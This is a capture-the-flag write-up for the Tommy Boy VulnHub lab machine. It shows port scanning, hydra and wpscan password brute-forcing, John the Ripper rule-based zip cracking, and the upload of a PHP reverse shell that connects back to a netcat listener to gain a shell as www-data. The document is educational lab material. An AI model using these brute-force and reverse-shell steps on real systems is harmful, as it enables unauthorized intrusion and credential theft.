---
layout: post
title: "Tommy Boy hacking challenge"
date: 2016-09-07 00:24:45 -0400
comments: true
categories: boot2root
---

I started this right after I finished [Necromancer](/2016/09/04/necromancer-hacking-challenge/), and it took much longer that I had expected. Lots of trolls along the way, and a bit too much brute-forcing for my liking. Good beginner level challenge, go grab it on [VulnHub](https://www.vulnhub.com/entry/tommy-boy-1,157/) if you want to take it for a spin. 

I started off with a port scan to see what juicy ports were waiting to br prodded:

```
# onetwopunch.sh -t ip -i eth1 -n "-sV -A" 
                             _                                          _       _ 
  ___  _ __   ___           | |___      _____    _ __  _   _ _ __   ___| |__   / \
 / _ \| '_ \ / _ \          | __\ \ /\ / / _ \  | '_ \| | | | '_ \ / __| '_ \ /  /
| (_) | | | |  __/ ᕦ(ò_óˇ)ᕤ | |_ \ V  V / (_) | | |_) | |_| | | | | (__| | | /\_/ 
 \___/|_| |_|\___|           \__| \_/\_/ \___/  | .__/ \__,_|_| |_|\___|_| |_\/   
                                                |_|                               
                                                                   by superkojiman

[+] Protocol : tcp
[+] Interface: eth1
[+] Nmap opts: -sV -A
[+] Targets  : ip
[+] Scanning 172.16.146.141 for tcp ports...
[+] Obtaining all open TCP ports using unicornscan...
[+] unicornscan -i eth1 -mT 172.16.146.141:a -l /root/.onetwopunch/udir/172.16.146.141-tcp.txt
[*] TCP ports for nmap to scan: 22,80,8008,65534,
[+] nmap -e eth1 -sV -A -oX /root/.onetwopunch/ndir/172.16.146.141-tcp.xml -oG /root/.onetwopunch/ndir/172.16.146.141-tcp.grep -p 22,80,8008,65534, 172.16.146.141

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2016-09-05 15:38 EDT
Nmap scan report for 172.16.146.141
Host is up (0.00027s latency).
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a0:ca:62:ce:f6:7e:ae:8b:62:de:0b:db:21:3f:b0:d6 (RSA)
|_  256 46:6d:4b:4b:02:86:89:27:28:5c:1d:87:10:55:3d:59 (ECDSA)
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 4 disallowed entries 
| /6packsofb...soda /lukeiamyourfather 
|_/lookalivelowbridge /flag-numero-uno.txt
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to Callahan Auto
8008/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: KEEP OUT
65534/tcp open  ftp     ProFTPD
MAC Address: 00:0C:29:2E:7F:42 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.27 ms 172.16.146.141

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.91 seconds
[+] Scanning  for tcp ports...
[+] Obtaining all open TCP ports using unicornscan...
[+] unicornscan -i eth1 -mT :a -l /root/.onetwopunch/udir/-tcp.txt
[!] No TCP ports found
[+] Scans completed
[+] Results saved to /root/.onetwopunch

```

So a handful of open ports; SSH on port 22, HTTP on ports 80 and 8008, and FTP on port 65534. I decided to examine FTP first, but found that the port wasn't responding. So either I crashed it, or I triggered some kind of IDS. In any case, I decided to look at the HTTP sites next, so I pulled down robots.txt:


```
# curl http://172.16.146.141/robots.txt
User-agent: *
Disallow: /6packsofb...soda
Disallow: /lukeiamyourfather
Disallow: /lookalivelowbridge
Disallow: /flag-numero-uno.txt
```

The last entry looked like it was the first flag:

```
# curl http://172.16.146.141/flag-numero-uno.txt
This is the first of five flags in the Callhan Auto server.  You'll need them all to unlock
the final treasure and fully consider the VM pwned!

Flag data: B34rcl4ws
```

Flag one, check. Browsing through the main page on port 80, I found several comments:

```
<!--Comment from Nick: backup copy is in Big Tom's home folder-->
<!--Comment from Richard: can you give me access too? Big Tom's the only one w/password-->
<!--Comment from Nick: Yeah yeah, my processor can only handle one command at a time-->
<!--Comment from Richard: please, I'll ask nicely-->
<!--Comment from Nick: I will set you up with admin access *if* you tell Tom to stop storing important information in the company blog-->
<!--Comment from Richard: Deal.  Where's the blog again?-->
<!--Comment from Nick: Seriously? You losers are hopeless. We hid it in a folder named after the place you noticed after you and Tom Jr. had your big fight. You know, where you cracked him over the head with a board. It's here if you don't remember: https://www.youtube.com/watch?v=VUxOd4CszJ8--> 
<!--Comment from Richard: Ah! How could I forget?  Thanks-->
```

There appear to be several users on the system: Nick, Richard, Big Tom, and Tom Jr. Handy in case I need to enumerate users later on. There was also a link to a YouTube video, which hinted at where Big Tom's blog was. In this case, the video talked about "Prehistoric Forest", and with a bit of guesswork, I found that the blog was on http://172.16.146.141/prehistoricforest/

Alright, so there were a lot of things on the blog. First off, I found the second flag at http://172.16.146.141/prehistoricforest/index.php/2016/07/06/announcing-the-callahan-internal-company-blog/. Specifically, the reply from Michelle:

```
Well put boss 😉

Flag #2: thisisthesecondflagyayyou.txt
```

Browsing to that file revealed:

```
# curl http://172.16.146.141/prehistoricforest/thisisthesecondflagyayyou.txt
You've got 2 of five flags - keep it up!

Flag data: Z4l1nsky
```

Second, three's a post with password proected content, and a folder called /richard was revealed under the post http://172.16.146.141/prehistoricforest/index.php/2016/07/07/son-of-a/ This folder was supposed to contain a hint on what the password was to view the secured post.

Third, I found a new user, Michelle, and BurpSuite also managed to capture usernames for Richard, Tom. Jr, and Big Tom:

```
/prehistoricforest/index.php/author/richard/
/prehistoricforest/index.php/author/tommy/
/prehistoricforest/index.php/author/tom/
```

I checked out /richard and found an image called shockedrichard.jpg. No idea what that meant. I tried /tommy as well and found two files, hi, and hi.txt. The former was an empty file, but the latter was a copy of what appeared to be /etc/passwd. 

```
# curl http://172.16.146.141/tommy/hi.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
tommy:x:1000:1000:Tommy,,,:/home/tommy:/bin/bash
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
```

The only real user in this list appeared to be tommy.

I also found directories /forest, /bigtom, /nick, and /michelle, but they were all empty. I decided it might be a good idea to run a directory scan on the target in case I missed out on anything else. 

```
# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.16.146.141 -n  > out.txt
```

Well it turned out there were a *lot* of directories, but most of them were likely empty. I needed to determine which ones had any real content. Directories that were empty returned 15 lines in total:

```
# curl -s http://172.16.146.141/download/ | wc -l
15
```

Therefore those with content should return more. Easy enough to script out. I edited out gobuster's headers in out.txt so that it only contained directories to try. 

```
#!/bin/bash

while read line; do
    #echo "Checking $line..."
    n=`curl -s http://172.16.146.141/${line}/ | wc -l`
    if [[ $n -ne 15 ]]; then
        echo "${line}"
    fi 
done < out.txt
```

Running it revealed only two directories that had any real content:

```
# ./find_dir.sh 
/pictures
/richard
```

Ok, so I examined the image in the /richard directory with exiftool, and found a user comment:

```
User Comment                    : ce154b5a8e59c89732bc25d6a2e6b90b
```

I Googled it and came up with the MD5 hash for the word "spanky". I used that as the password and was able to view the contents of the secured post. More clues were provided here:

* The FTP server would starts on the hour and runs for 15 minutes. After that it would turn off for 15 minutes, and turn back on 15 minutes later. This explained the odd behaviour I was seeing with the FTP server. 
* The FTP login was nickburns with an obvious password. 
* Big Tom's account on the blog wasn't called Big Tom, but something else. 

Ok, I waited untilt he FTP server was back online before I ran a brute force attack on it: 

```
# hydra -l nickburns -P ~/Desktop/wordlists/top500.txt -s 65534 -e nsr -VV -o hydra.ftp ftp://172.16.146.141
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-09-06 01:01:09
[DATA] max 16 tasks per 1 server, overall 64 tasks, 503 login tries (l:1/p:503), ~0 tries per task
[DATA] attacking service ftp on port 65534
[ATTEMPT] target 172.16.146.141 - login "nickburns" - pass "nickburns" - 1 of 503 [child 0]
[ATTEMPT] target 172.16.146.141 - login "nickburns" - pass "" - 2 of 503 [child 1]
[ATTEMPT] target 172.16.146.141 - login "nickburns" - pass "snrubkcin" - 3 of 503 [child 2]
[ATTEMPT] target 172.16.146.141 - login "nickburns" - pass "123456" - 4 of 503 [child 3]
[ATTEMPT] target 172.16.146.141 - login "nickburns" - pass "password" - 5 of 503 [child 4]
[ATTEMPT] target 172.16.146.141 - login "nickburns" - pass "12345678" - 6 of 503 [child 5]
[ATTEMPT] target 172.16.146.141 - login "nickburns" - pass "1234" - 7 of 503 [child 6]
[ATTEMPT] target 172.16.146.141 - login "nickburns" - pass "pussy" - 8 of 503 [child 7]
[ATTEMPT] target 172.16.146.141 - login "nickburns" - pass "12345" - 9 of 503 [child 8]
[ATTEMPT] target 172.16.146.141 - login "nickburns" - pass "dragon" - 10 of 503 [child 9]
[ATTEMPT] target 172.16.146.141 - login "nickburns" - pass "qwerty" - 11 of 503 [child 10]
[ATTEMPT] target 172.16.146.141 - login "nickburns" - pass "696969" - 12 of 503 [child 11]
[ATTEMPT] target 172.16.146.141 - login "nickburns" - pass "mustang" - 13 of 503 [child 12]
[ATTEMPT] target 172.16.146.141 - login "nickburns" - pass "letmein" - 14 of 503 [child 13]
[ATTEMPT] target 172.16.146.141 - login "nickburns" - pass "baseball" - 15 of 503 [child 14]
[ATTEMPT] target 172.16.146.141 - login "nickburns" - pass "master" - 16 of 503 [child 15]
[ATTEMPT] target 172.16.146.141 - login "nickburns" - pass "michael" - 17 of 503 [child 5]
[65534][ftp] host: 172.16.146.141   login: nickburns   password: nickburns
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2016-09-06 01:01:10
```

Well, it turned out I didn't need a wordlist after all since the password was the same as the username. Finally, I could log in to the FTP server:

```
# ftp 172.16.146.141 65534
Connected to 172.16.146.141.
220 Callahan_FTP_Server 1.3.5
Name (172.16.146.141:root): nickburns
331 Password required for nickburns
Password:
230 User nickburns logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-x---   4 nickburns nickburns     4096 Jul 20 20:42 .
drwxr-x---   4 nickburns nickburns     4096 Jul 20 20:42 ..
-rw-r--r--   1 root     root            0 Jul 21 22:47 .bash_history
drwx------   2 nickburns nickburns     4096 Jul  6 22:37 .cache
drwxrwxr-x   2 nickburns nickburns     4096 Jul  6 22:37 .nano
-rw-rw-r--   1 nickburns nickburns      977 Jul 15 02:37 readme.txt
226 Transfer complete
ftp> get readme.txt
local: readme.txt remote: readme.txt
200 PORT command successful
150 Opening BINARY mode data connection for readme.txt (977 bytes)
226 Transfer complete
977 bytes received in 0.00 secs (1.9909 MB/s)
ftp> quit
221 Goodbye.
```

I grabbed the readme.txt file which contained more information about what to do next:

```
# cat readme.txt 
To my replacement:

If you're reading this, you have the unfortunate job of taking over IT responsibilities
from me here at Callahan Auto.  HAHAHAHAHAAH! SUCKER!  This is the worst job ever!  You'll be
surrounded by stupid monkeys all day who can barely hit Ctrl+P and wouldn't know a fax machine
from a flame thrower!

Anyway I'm not completely without mercy.  There's a subfolder called "NickIzL33t" on this server
somewhere. I used it as my personal dropbox on the company's dime for years.  Heh. LOL.
I cleaned it out (no naughty pix for you!) but if you need a place to dump stuff that you want
to look at on your phone later, consider that folder my gift to you.

Oh by the way, Big Tom's a moron and always forgets his passwords and so I made an encrypted
.zip of his passwords and put them in the "NickIzL33t" folder as well.  But guess what?
He always forgets THAT password as well.  Luckily I'm a nice guy and left him a hint sheet.

Good luck, schmuck!

LOL.

-Nick
```

I had poked though HTTP running on port 8008 earlier and remembered seeing something about not being 1337 enough for that webpage. I assumed that was where I had to go to next. So I browsed to http://172.16.146.141:8008/NickIzL33t Sure enough:

```
# curl http://172.16.146.141:8008/NickIzL33t
<H1>Nick's sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content</H1><H2>Lol</H2>
```

Ok, nothing of interest, and in fact it returned a HTTP code 403. I pondered over this a bit and realized that Steve Jobs was mentioned a couple of times in this directory, and the server's root directory. So I wondered what would happen if I changed the browser's User Agent to something Apple related. I tried Safari, Mac OS X, but in the end, it was iPhone that worked! Here's the HTTP request:

```
GET /NickIzL33t/ HTTP/1.1
Host: 172.16.146.141:8008
User-Agent: iPhone
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
```

And I received the following response:

```
Well, you passed the dummy test
But Nick's secret door isn't that easy to open.
Gotta know the EXACT name of the .html to break into this fortress.
Good luck brainiac.
Lol
-Nick 
```

Ok, I could try brute-forcing now. 

```
# gobuster -a 'iPhone' -u http://172.16.146.141:8008/NickIzL33t/ -w /usr/share/wordlists/rockyou.txt -x .html

Gobuster v1.1                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://172.16.146.141:8008/NickIzL33t/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/rockyou.txt
[+] Status codes : 302,307,200,204,301
[+] User Agent   : iPhone
[+] Extensions   : .html
=====================================================
/?????? (Status: 200)
/??????.html (Status: 200)
/////// (Status: 200)
/fallon1.html (Status: 200)
/????? (Status: 200)
/?????.html (Status: 200)
```

I tried /fallon1.html and scored:

```
<html>
<title>W 0 W!</title>
Nice work.  Here are the goodies in Nick's personal super secret dropbox:
<p>
<ul>
<li><a href="hint.txt">A hint</a> - you'll need it
<li><a href="flagtres.txt">The third flag</a> - you're not hopeless after all
<li><a href="t0msp4ssw0rdz.zip">Big Tom's encrypted pw backups</a> - because that big tub of dumb can never remember them
</ul>
<!--Note: Still working on file upload capabilities in the P4TCH_4D4MS folder-->
</html>
```

So I got links to the hint, the third flag, and the encrypted backups. Also, a comment at the end suggested another folder called P4TCH_4D4MS with an upload function. 

The third flag contained:

```
# curl -A iPhone http://172.16.146.141:8008/NickIzL33t/flagtres.txt
THREE OF 5 FLAGS - you're awesome sauce.

Flag data: TinyHead
```

The hint contained yet more clues:

```
Big Tom,

Your password vault is protected with (yep, you guessed it) a PASSWORD!  
And because you were choosing stupidiculous passwords like "password123" and "brakepad" I
enforced new password requirements on you...13 characters baby! MUAHAHAHAHAH!!!

Your password is your wife's nickname "bev" (note it's all lowercase) plus the following:

* One uppercase character
* Two numbers
* Two lowercase characters
* One symbol
* The year Tommy Boy came out in theaters

Yeah, fat man, that's a lot of keys to push but make sure you type them altogether in one 
big chunk ok?  Heh, "big chunk."  A big chunk typing big chunks.  That's funny.

LOL

-Nick
```

It looked like I had to specify some password cracking rules in order to crack the password protected backup. Not being a fan of brute-forcing and password cracking, I postponed that for a bit and looked into the P4TCH_4D4MS directory instead. As suggested in the comment, it allowed me to upload images. So I tried uploading a jpg:

```
The file richard.jpg has been uploaded to /uploads. 
```

Sure enough, the image could be found at http://172.16.146.141:8008/NickIzL33t/P4TCH_4D4MS/uploads/richard.jpg Now I tried uploading a .php file and it didn't work. I got the following message:

```
Sorry, only JPG, JPEG, PNG & GIF files are allowed, douchenozzle! Sorry, your file was not uploaded.  Want me to save your game of Minesweeper though? 
```

After some trial and error, I found that I could upload something like test.php.jpeg and it would accept it. I could download that file using curl, but it didn't appear to be executing the PHP code. It did say in the comment that it was broken, so perhaps this was a troll.

In any case, I moved back to the password cracking. Based on the clues provided on the password format, and after pouring over John's rules documentation, I came up with the following rule in john.conf that satisfied the password requirements:

```
[List.Rules:Tommy]
$[A-Z] $[0-9]$[0-9] $[a-z]$[a-z] $[$%^&*()\-_+=|\<>\[\]{}#@/~] $1$9$9$5
```

I used john to generate a wordlist for me using the rule:

```
# cat /root/tommy/pass.txt
bev
# ./john --wordlist=/root/tommy/pass.txt --stdout --rules:Tommy > /root/tommy/custom_wordlist.txt
```

The end result was 38,667,200 potential passwords. Time to start cracking:

```
# ./john --wordlist=/root/tommy/custom_wordlist.txt  /root/tommy/zip.john 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Warning: OpenMP is disabled; a non-OpenMP build may be faster
Press 'q' or Ctrl-C to abort, almost any other key for status
bevH00tr$1995    (t0msp4ssw0rdz.zip)
1g 0:00:00:01 DONE (2016-09-06 16:40) 0.5434g/s 5665Kp/s 5665Kc/s 5665KC/s bevH00re<1995..bevH00yi]1995
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Got it. Password was bevH00tr$1995 

```
# unzip t0msp4ssw0rdz.zip 
Archive:  t0msp4ssw0rdz.zip
[t0msp4ssw0rdz.zip] passwords.txt password: 
  inflating: passwords.txt           
```

Now to finally see what was in here.

```
# cat passwords.txt
Sandusky Banking Site
------------------------
Username: BigTommyC
Password: money

TheKnot.com (wedding site)
---------------------------
Username: TomC
Password: wedding

Callahan Auto Server
----------------------------
Username: bigtommysenior
Password: fatguyinalittlecoat

Note: after the "fatguyinalittlecoat" part there are some numbers, but I don't remember what they are.
However, I wrote myself a draft on the company blog with that information.

Callahan Company Blog
----------------------------
Username: bigtom(I think?)
Password: ??? 
Note: Whenever I ask Nick what the password is, he starts singing that famous Queen song.
```

I spent a *long* time trying to figure out what the last clue meant regarding a Queen song. Finally I decided to just run another brute-force attack on the blog using wpscan. I already knew the users for the blog from earlier enumeration, so I just focused on getting tom's password:

```
# wpscan --url http://172.16.146.141/prehistoricforest --wordlist /usr/share/wordlists/rockyou.txt --username tom
.
.
.
[+] Starting the password brute forcer
  [+] [SUCCESS] Login : tom Password : tomtom1                                                                                                                                                       

  Brute Forcing 'tom' Time: 00:03:25 <                                                                                                                     > (24680 / 14344393)  0.17%  ETA: 33:10:51
  +----+-------+------+----------+
  | Id | Login | Name | Password |
  +----+-------+------+----------+
  |    | tom   |      | tomtom1  |
  +----+-------+------+----------+

[+] Finished: Tue Sep  6 19:39:33 2016
[+] Requests Done: 24727
[+] Memory used: 29.785 MB
[+] Elapsed time: 00:03:29
```

Having obtained the password, I logged into the blog as tom, and found his draft message:

```
Ok so Nick always yells at me for forgetting the second part of my "ess ess eight (ache? H?) password so I'm writing it here:

1938!!

Nick, if you're reading this, I DON'T CARE IF I"M USING THIS THING AS A PASSWORD VAULT. YOU TOOK AWAY MY STICKIES SO I"LL PUT MY PASSWORDS ANY DANG PLACE I WANT.
```

So it seemed the SSH password for tom was fatguyinalittlecoat1938!! Fingers crossed:


```
# ssh bigtommysenior@172.16.146.141
bigtommysenior@172.16.146.141's password: 
Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

143 packages can be updated.
0 updates are security updates.


Last login: Thu Jul 14 13:45:57 2016
bigtommysenior@CallahanAutoSrv01:~$ 
```

Finally, a shell. A quick directory listing revealed the fourth flag:

```
bigtommysenior@CallahanAutoSrv01:~$ ls -la
total 40
drwxr-x--- 4 bigtommysenior bigtommysenior 4096 Jul  8 08:57 .
drwxr-xr-x 5 root           root           4096 Jul  7 00:17 ..
-rw------- 1 bigtommysenior bigtommysenior    0 Jul 21 17:47 .bash_history
-rw-r--r-- 1 bigtommysenior bigtommysenior  220 Jul  7 00:12 .bash_logout
-rw-r--r-- 1 bigtommysenior bigtommysenior 3771 Jul  7 00:12 .bashrc
drwx------ 2 bigtommysenior bigtommysenior 4096 Jul  7 00:16 .cache
-rw-r--r-- 1 bigtommysenior bigtommysenior  307 Jul  7 14:18 callahanbak.bak
-rw-rw-r-- 1 bigtommysenior bigtommysenior  237 Jul  7 15:27 el-flag-numero-quatro.txt
-rw-rw-r-- 1 bigtommysenior bigtommysenior  630 Jul  7 17:59 LOOT.ZIP
drwxrwxr-x 2 bigtommysenior bigtommysenior 4096 Jul  7 13:50 .nano
-rw-r--r-- 1 bigtommysenior bigtommysenior  675 Jul  7 00:12 .profile
-rw-r--r-- 1 bigtommysenior bigtommysenior    0 Jul  7 00:17 .sudo_as_admin_successful
```

I had the fourth flag, and the location of the fifth flag. Or so I thought:

```
bigtommysenior@CallahanAutoSrv01:~$ cat el-flag-numero-quatro.txt 
YAY!  Flag 4 out of 5!!!! And you should now be able to restore the Callhan Web server to normal
working status.

Flag data: EditButton

But...but...where's flag 5?  

I'll make it easy on you.  It's in the root of this server at /5.txt
```

Well, the document was incorrect. The fifth flag was actually /.5.txt:

```
bigtommysenior@CallahanAutoSrv01:~$ ls -la /
total 105
drwxr-xr-x  25 root     root      4096 Jul 15 12:35 .
drwxr-xr-x  25 root     root      4096 Jul 15 12:35 ..
-rwxr-x---   1 www-data www-data   520 Jul  7 15:36 .5.txt
.
.
.
```

It was read-only by the www-data user. No problem, I had an idea on how to get that flag already. I just needed a shell as www-data, and I remembered that there was an upload form at the P4TCH_4D4MS folder referred to in Nick's dropbox. Looking at /etc/apache2/sites-enabled/2.conf revealed that its document root was in /var/thatsg0nnaleaveamark. The upload folder had read/write/execute privileges by everyone.

```
bigtommysenior@CallahanAutoSrv01:~$ ls -ld /var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads/
drwxrwxrwx 2 www-data www-data 4096 Sep  6 14:09 /var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads/
```

My solution was simple. Just put a PHP reverse shell in there so I could get a shell as www-data. I transferred my PHP reverse shell over:

```
# scp phprshell.php bigtommysenior@172.16.146.141:/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads/
bigtommysenior@172.16.146.141's password: 
phprshell.php                                                                                                                                                      100% 5495     6.8MB/s   00:00    
```

I setup a listener on another terminal and used curl to get the script to execute. 

```
# curl -A iPhone http://172.16.146.141:8008/NickIzL33t/P4TCH_4D4MS/uploads/phprshell.php
```

And my reverse shell:

```
# nc -lvp 443
listening on [any] 443 ...
172.16.146.141: inverse host lookup failed: Unknown host
connect to [172.16.146.139] from (UNKNOWN) [172.16.146.141] 45340
Linux CallahanAutoSrv01 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 23:01:02 up 1 day,  5:28,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
bigtommy pts/0    172.16.146.139   22:48   25.00s  0.38s  0.38s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Onwards to the fifth flag:

```
$ cat /.5.txt
FIFTH FLAG!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
YOU DID IT!!!!!!!!!!!!!!!!!!!!!!!!!!!!
OH RICHARD DON'T RUN AWAY FROM YOUR FEELINGS!!!!!!!!

Flag data: Buttcrack

Ok, so NOW what you do is take the flag data from each flag and blob it into one big chunk.
So for example, if flag 1 data was "hi" and flag 2 data was "there" and flag 3 data was "you"
you would create this blob:

hithereyou

Do this for ALL the flags sequentially, and this password will open the loot.zip in Big Tom's
folder and you can call the box PWNED.
```

Ok, so to recap, here are the flags:

1. B34rcl4ws
1. Z4l1nsky
1. TinyHead
1. EditButton
1. Buttcrack

So the password for the LOOT.zip file should be B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack 

```
bigtommysenior@CallahanAutoSrv01:~$ unzip LOOT.ZIP 
Archive:  LOOT.ZIP
[LOOT.ZIP] THE-END.txt password: 
  inflating: THE-END.txt             
bigtommysenior@CallahanAutoSrv01:~$ cat THE-END.txt 
YOU CAME.
YOU SAW.
YOU PWNED.

Thanks to you, Tommy and the crew at Callahan Auto will make 5.3 cajillion dollars this year.

GREAT WORK!

I'd love to know that you finished this VM, and/or get your suggestions on how to make the next 
one better.

Please shoot me a note at 7ms @ 7ms.us with subject line "Here comes the meat wagon!"

Or, get in touch with me other ways:

* Twitter: @7MinSec
* IRC (Freenode): #vulnhub (username is braimee)

Lastly, please don't forget to check out www.7ms.us and subscribe to the podcast at
bit.ly/7minsec

</shamelessplugs>

Thanks and have a blessed week!

-Brian Johnson
7 Minute Security
```

Phew! Made it to the end at last! Pretty cool VM, but a bit too much brute-forcing for my taste. Still, it's not often I get my hands dirty with messing around John The Ripper rules, so it was nice to poke around something I wasn't very familiar with. Thanks [@7MinSec](https://twitter.com/@7MinSec) for a fun ride!
